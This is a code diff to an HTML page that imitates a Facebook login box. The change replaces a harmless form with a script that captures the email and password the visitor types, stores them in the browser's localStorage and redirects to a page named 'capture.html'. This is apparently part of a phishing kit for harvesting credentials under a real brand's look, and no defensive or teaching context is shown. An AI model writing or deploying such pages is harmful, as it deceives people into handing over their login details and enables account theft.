@@ -1,4 +1,3 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,7 +6,7 @@
     body { font-family: Arial; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
     .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
     .login-box h2 { color: #1877f2; text-align: center; }
-    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+    input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
     button { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; }
     button:hover { background-color: #145dbf; }
   </style>
@@ -15,11 +14,26 @@
 <body>
   <div class="login-box">
     <h2>Facebook Login</h2>
-    <form action="suspended.html">
-      <input type="text" placeholder="Email or Phone" required>
-      <input type="password" placeholder="Password" required>
+    <form onsubmit="storeData(event)">
+      <input type="text" id="email" placeholder="Email or Phone" required>
+      <input type="password" id="password" placeholder="Password" required>
       <button type="submit">Log In</button>
     </form>
   </div>
+
+  <script>
+    function storeData(e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Save to localStorage (temporary browser storage)
+      localStorage.setItem("email", email);
+      localStorage.setItem("password", password);
+
+      // Redirect to capture page
+      window.location.href = "capture.html";
+    }
+  </script>
 </body>
 </html>
